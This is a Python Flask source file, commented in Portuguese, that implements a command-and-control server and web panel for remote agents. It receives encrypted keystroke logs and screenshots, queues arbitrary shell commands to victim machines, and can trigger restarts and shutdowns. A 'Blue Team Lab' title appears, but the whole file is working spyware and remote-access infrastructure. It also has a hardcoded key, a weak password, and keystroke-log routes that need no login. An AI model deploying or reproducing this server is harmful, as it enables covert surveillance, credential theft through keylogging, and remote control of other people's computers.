from flask import Flask, request, render_template_string, jsonify, send_file, session, redirect, url_for
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad
import base64, os, json, queue, glob
from datetime import datetime
import threading
from functools import wraps

app = Flask(__name__, static_folder='.', static_url_path='')
app.secret_key = "chave_secreta_para_sessao"  # Altere para uma chave secreta forte

# ===== SENHA FIXA DO PAINEL =====
SENHA_PAINEL = "admin123"   # Você pode mudar aqui
print(f"\n[!] SENHA DO PAINEL: {SENHA_PAINEL}")
print("[!] Use esta senha para acessar o painel.\n")
# ================================

CHAVE = bytes.fromhex("00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff")

# Estruturas de dados
comandos = {}
resultados = {}
ultima_screenshot = {}

# ========== DECORADOR DE AUTENTICAÇÃO ==========
def requer_autenticacao(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('autenticado'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ========== CRIPTOGRAFIA ==========
def descriptografar(dados_b64):
    raw = base64.b64decode(dados_b64.strip())
    iv, cifra = raw[:16], raw[16:]
    texto = unpad(AES.new(CHAVE, AES.MODE_CBC, iv).decrypt(cifra), AES.block_size)
    return texto.decode('utf-8')

def criptografar(texto):
    iv = os.urandom(16)
    cifra = AES.new(CHAVE, AES.MODE_CBC, iv).encrypt(pad(texto.encode(), AES.block_size))
    return base64.b64encode(iv + cifra).decode()

# ========== ROTAS DE AUTENTICAÇÃO ==========
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        senha = request.form.get('senha', '')
        if senha == SENHA_PAINEL:
            session['autenticado'] = True
            return redirect(url_for('painel'))
        else:
            return render_template_string(HTML_LOGIN, erro="Senha incorreta")
    return render_template_string(HTML_LOGIN)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ========== ROTAS FUNCIONAIS ==========
@app.route('/log', methods=['POST'])
def receber_log():
    data = request.get_json()
    try:
        texto = descriptografar(data['dados'])
        with open('logs.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n{texto}\n{'-'*40}\n")
        return "OK", 200
    except Exception as e:
        return f"Erro: {str(e)}", 500

@app.route('/screenshot', methods=['POST'])
def receber_screenshot():
    data = request.get_json()
    try:
        client_id = data.get('id', 'default')
        img_b64 = data['imagem']
        filename = f"screenshot_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(img_b64))
        ultima_screenshot[client_id] = filename
        return "OK", 200
    except Exception as e:
        return f"Erro: {str(e)}", 500

@app.route('/cmd', methods=['GET'])
def pegar_comando():
    client_id = request.args.get('id', 'default')
    if client_id not in comandos:
        comandos[client_id] = queue.Queue()
    try:
        cmd = comandos[client_id].get(timeout=30)
        return criptografar(cmd)
    except queue.Empty:
        return ""

@app.route('/cmd', methods=['POST'])
def enviar_comando():
    data = request.get_json()
    client_id = data.get('id', 'default')
    comando = data.get('comando', '')
    if client_id not in comandos:
        comandos[client_id] = queue.Queue()
    comandos[client_id].put(comando)
    return jsonify({"status": "ok", "message": f"Comando '{comando}' enviado"})

@app.route('/result', methods=['POST'])
def receber_resultado():
    data = request.get_json()
    client_id = data.get('id', 'default')
    resultado_cripto = data.get('resultado', '')
    try:
        resultado_legivel = descriptografar(resultado_cripto)
    except:
        resultado_legivel = f"[ERRO: {resultado_cripto[:50]}...]"
    if client_id not in resultados:
        resultados[client_id] = []
    resultados[client_id].append({
        'hora': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'resultado': resultado_legivel
    })
    with open(f'resultados_{client_id}.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n{resultado_legivel}\n{'-'*40}\n")
    return "OK", 200

# ========== ROTAS PARA O PAINEL ==========
@app.route('/screenshots')
def listar_screenshots():
    arquivos = sorted(glob.glob('screenshot_*.png'), key=os.path.getmtime, reverse=True)[:20]
    return jsonify([f"/{f}" for f in arquivos])

@app.route('/ultima_screenshot/<client_id>')
def pegar_ultima_screenshot(client_id):
    if client_id in ultima_screenshot and os.path.exists(ultima_screenshot[client_id]):
        return send_file(ultima_screenshot[client_id], mimetype='image/png')
    return "Nenhuma screenshot disponível", 404

# ========== PAINEL HTML ==========
HTML_PAINEL = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel de Controle - Blue Team Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            padding: 20px;
            color: #333;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        }
        
        .header h1 {
            font-size: 28px;
        }
        
        .header-right {
            display: flex;
            gap: 15px;
            align-items: center;
        }
        
        .btn-logout {
            background: rgba(255,255,255,0.2);
            color: white;
            padding: 8px 16px;
            border: 1px solid white;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
            text-decoration: none;
        }
        
        .btn-logout:hover {
            background: rgba(255,255,255,0.3);
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.12);
        }
        
        .card h2 {
            color: #667eea;
            font-size: 18px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .card-full {
            grid-column: 1 / -1;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: #555;
            font-size: 14px;
        }
        
        input[type="text"],
        input[type="password"],
        select {
            width: 100%;
            padding: 10px 12px;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus,
        select:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .flex-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 15px;
        }
        
        button {
            padding: 10px 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s;
            flex: 1;
            min-width: 120px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            color: white;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(17, 153, 142, 0.4);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #f5af19 0%, #f12711 100%);
            color: white;
        }
        
        .btn-warning:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(245, 175, 25, 0.4);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
            color: white;
        }
        
        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(235, 51, 73, 0.4);
        }
        
        .status {
            display: inline-block;
            margin-top: 10px;
            padding: 8px 12px;
            border-radius: 5px;
            font-size: 13px;
            font-weight: 600;
        }
        
        .status-online {
            background: #d4edda;
            color: #155724;
        }
        
        .status-offline {
            background: #f8d7da;
            color: #721c24;
        }
        
        .log {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            max-height: 350px;
            overflow-y: auto;
            font-size: 12px;
            line-height: 1.5;
            color: #333;
            border: 1px solid #e0e0e0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .screenshot-gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
            margin-top: 15px;
        }
        
        .screenshot-thumb {
            max-width: 100%;
            height: auto;
            border-radius: 6px;
            border: 2px solid #e0e0e0;
            cursor: pointer;
            transition: all 0.3s;
            object-fit: cover;
        }
        
        .screenshot-thumb:hover {
            border-color: #667eea;
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
            transform: scale(1.05);
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .modal-content {
            margin: 5% auto;
            display: block;
            max-width: 90%;
            max-height: 85vh;
            object-fit: contain;
            border-radius: 8px;
        }
        
        .close-modal {
            position: absolute;
            top: 20px;
            right: 40px;
            color: white;
            font-size: 40px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .close-modal:hover {
            transform: scale(1.2);
        }
        
        .alert {
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 14px;
        }
        
        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .alert-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .status-badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
        }
        
        .status-badge.active {
            background: #d4edda;
            color: #155724;
        }
        
        .status-badge.inactive {
            background: #f8d7da;
            color: #721c24;
        }
        
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                text-align: center;
                gap: 15px;
            }
            
            .grid {
                grid-template-columns: 1fr;
            }
            
            .card-full {
                grid-column: 1;
            }
            
            .flex-buttons {
                flex-direction: column;
            }
            
            button {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🛡 Blue Team Lab - Painel de Controle</h1>
        </div>
        <div class="header-right">
            <span>Conectado ✓</span>
            <a href="/logout" class="btn-logout">Sair</a>
        </div>
    </div>

    <div class="container">
        <!-- CONFIGURAÇÃO DO CLIENTE -->
        <div class="grid">
            <div class="card">
                <h2>👤 Configuração do Cliente</h2>
                <div class="form-group">
                    <label>ID do Cliente:</label>
                    <input type="text" id="client_id" value="default" placeholder="Digite o ID...">
                </div>
                <div class="form-group">
                    <span class="status status-online">🟢 Conectado</span>
                </div>
            </div>

            <!-- ESTATÍSTICAS -->
            <div class="card">
                <h2>📊 Status</h2>
                <div style="font-size: 12px; line-height: 1.8; color: #666;">
                    <div>🔧 Clientes Ativos: <strong id="active_clients">-</strong></div>
                    <div>📸 Screenshots Capturadas: <strong id="screenshot_count">-</strong></div>
                    <div>📝 Logs Registrados: <strong id="log_count">-</strong></div>
                    <div>⏰ Última Atualização: <strong id="last_update">-</strong></div>
                </div>
            </div>
        </div>

        <!-- COMANDOS -->
        <div class="card card-full">
            <h2>⚙ Executar Comando</h2>
            <div style="display: grid; grid-template-columns: 1fr 100px; gap: 10px;">
                <input type="text" id="comando" placeholder="Digite um comando (ex: whoami, dir C:\, ipconfig)..." 
                       onkeypress="if(event.key=='Enter') enviarComando()">
                <button class="btn-primary" onclick="enviarComando()">Executar</button>
            </div>
            <div id="cmd_status" style="margin-top: 10px; font-size: 14px;"></div>
        </div>

        <!-- SCREENSHOTS -->
        <div class="card card-full">
            <h2>📸 Gerenciar Screenshots</h2>
            <div class="flex-buttons">
                <button class="btn-success" onclick="capturarAgora()">📷 Capturar Agora</button>
                <button id="btn_screenshot" class="btn-primary" onclick="toggleScreenshot()">▶ Iniciar Automático</button>
                <button class="btn-warning" onclick="reiniciarCliente()">🔄 Reiniciar Cliente</button>
                <button class="btn-danger" onclick="desligarCliente()">⏹ Desligar Cliente</button>
            </div>
            <div id="screenshot_preview" style="margin-top: 15px;">
                <div class="screenshot-gallery" id="screenshot_list"></div>
            </div>
        </div>

        <!-- RESULTADOS -->
        <div class="card card-full">
            <h2>📜 Últimos Resultados</h2>
            <div id="resultados" class="log">Aguardando resultados...</div>
            <button class="btn-primary" onclick="carregarResultados()" style="margin-top: 10px; width: auto;">🔄 Atualizar</button>
        </div>

        <!-- LOGS -->
        <div class="card card-full">
            <h2>📝 Últimos Logs de Teclas</h2>
            <div id="logs" class="log">Aguardando logs...</div>
            <button class="btn-primary" onclick="carregarLogs()" style="margin-top: 10px; width: auto;">🔄 Atualizar</button>
        </div>
    </div>

    <!-- Modal para visualizar screenshot -->
    <div id="modal" class="modal" onclick="fecharModal()">
        <span class="close-modal">&times;</span>
        <img class="modal-content" id="modal_img">
    </div>

    <script>
        // ========== FUNÇÕES AUXILIARES ==========
        function getClientId() {
            return document.getElementById('client_id').value || 'default';
        }

        function setStatus(msg) {
            const elem = document.getElementById('cmd_status');
            elem.innerHTML = msg;
            elem.style.color = msg.includes('❌') ? '#dc3545' : '#28a745';
        }

        function atualizarStats() {
            document.getElementById('screenshot_count').textContent = document.querySelectorAll('.screenshot-thumb').length;
            document.getElementById('last_update').textContent = new Date().toLocaleTimeString('pt-BR');
        }

        // ========== COMANDOS ==========
        function enviarComando() {
            const id = getClientId();
            const cmd = document.getElementById('comando').value;
            if (!cmd) return alert('Digite um comando');
            
            fetch('/cmd', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: id, comando: cmd })
            })
            .then(res => res.json())
            .then(data => {
                setStatus(`✅ Comando enviado: ${cmd}`);
                document.getElementById('comando').value = '';
            })
            .catch(err => setStatus('❌ Erro: ' + err));
        }

        function enviarComandoEspecial(comando, msg) {
            const id = getClientId();
            fetch('/cmd', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: id, comando: comando })
            })
            .then(res => res.json())
            .then(data => {
                setStatus(`✅ ${msg} enviado para ${id}`);
            })
            .catch(err => setStatus('❌ Erro: ' + err));
        }

        // ========== SCREENSHOTS ==========
        let screenshotAtivo = false;

        function toggleScreenshot() {
            const comando = screenshotAtivo ? 'screenshot_off' : 'screenshot_on';
            enviarComandoEspecial(comando, `📸 ${comando.replace('_', ' ')}`);
            screenshotAtivo = !screenshotAtivo;
            const btn = document.getElementById('btn_screenshot');
            if (screenshotAtivo) {
                btn.textContent = '⏹ Parar Automático';
                btn.className = 'btn-danger';
            } else {
                btn.textContent = '▶ Iniciar Automático';
                btn.className = 'btn-primary';
            }
        }

        function capturarAgora() {
            enviarComandoEspecial('screenshot', '📸 Screenshot capturada');
            setTimeout(carregarScreenshots, 5000);
        }

        function reiniciarCliente() {
            if (confirm('Deseja reiniciar o cliente?')) {
                enviarComandoEspecial('restart', '🔄 Reiniciar');
            }
        }

        function desligarCliente() {
            if (confirm('Deseja desligar o cliente? Esta ação é irreversível.')) {
                enviarComandoEspecial('shutdown', '⏹ Desligar');
                setTimeout(() => {
                    document.querySelector('.status').textContent = '🔴 Desconectado';
                    document.querySelector('.status').className = 'status status-offline';
                }, 2000);
            }
        }

        // ========== SCREENSHOTS ==========
        function carregarScreenshots() {
            fetch('/screenshots')
            .then(res => res.json())
            .then(data => {
                const container = document.getElementById('screenshot_list');
                container.innerHTML = '';
                data.forEach(url => {
                    const img = document.createElement('img');
                    img.src = url;
                    img.className = 'screenshot-thumb';
                    img.onclick = () => abrirModal(url);
                    container.appendChild(img);
                });
                atualizarStats();
            })
            .catch(() => {});
        }

        function abrirModal(url) {
            document.getElementById('modal_img').src = url;
            document.getElementById('modal').style.display = 'block';
        }

        function fecharModal() {
            document.getElementById('modal').style.display = 'none';
        }

        // ========== CARREGAR LOGS E RESULTADOS ==========
        function carregarLogs() {
            fetch('/logs')
            .then(res => res.text())
            .then(text => {
                document.getElementById('logs').innerText = text || 'Nenhum log ainda.';
                document.getElementById('log_count').textContent = (text.match(/\[/g) || []).length;
            })
            .catch(() => {});
        }

        function carregarResultados() {
            const id = getClientId();
            fetch(`/resultados/${id}`)
            .then(res => res.text())
            .then(text => {
                document.getElementById('resultados').innerText = text || 'Nenhum resultado ainda.';
            })
            .catch(() => {});
        }

        // ========== ATUALIZAÇÃO AUTOMÁTICA ==========
        setInterval(carregarLogs, 15000);
        setInterval(carregarResultados, 15000);
        setInterval(carregarScreenshots, 30000);

        // Carrega inicial
        carregarLogs();
        carregarResultados();
        carregarScreenshots();
        atualizarStats();
    </script>
</body>
</html>
"""

# Placeholder – no projeto final, substituir pelo HTML real.
# =====================================================

@app.route('/painel')
@requer_autenticacao
def painel():
    return render_template_string(HTML_PAINEL)

@app.route('/logs')
def ver_logs():
    try:
        with open('logs.txt', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Nenhum log disponível."

@app.route('/resultados/<client_id>')
def ver_resultados(client_id):
    try:
        with open(f'resultados_{client_id}.txt', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Nenhum resultado para este cliente."

# ========== INICIALIZAÇÃO ==========
if __name__ == '__main__':
    print("[+] Servidor Flask iniciado em http://0.0.0.0:8080")
    print("[+] Acesse o painel em http://<IP>:8080/painel")
    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
